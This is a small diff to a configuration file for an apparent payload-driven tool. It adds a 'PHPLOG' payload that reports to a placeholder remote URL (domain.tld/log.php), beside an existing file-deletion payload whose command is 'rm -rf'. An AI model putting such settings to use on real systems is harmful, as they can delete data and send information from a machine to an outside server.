@@ -28,3 +28,7 @@ PAYLOAD_DEL_FILES=no
 PAYLOAD_DEL_FILES_list="var/delfile" #plaintext list of files or directories, one per line
 PAYLOAD_DEL_FILES_command="rm -rf"
 
+#PAYLOAD_PHPLOG
+PAYLOAD_PHPLOG=yes
+PAYLOAD_PHPLOG_url=http://domain.tld/log.php
+
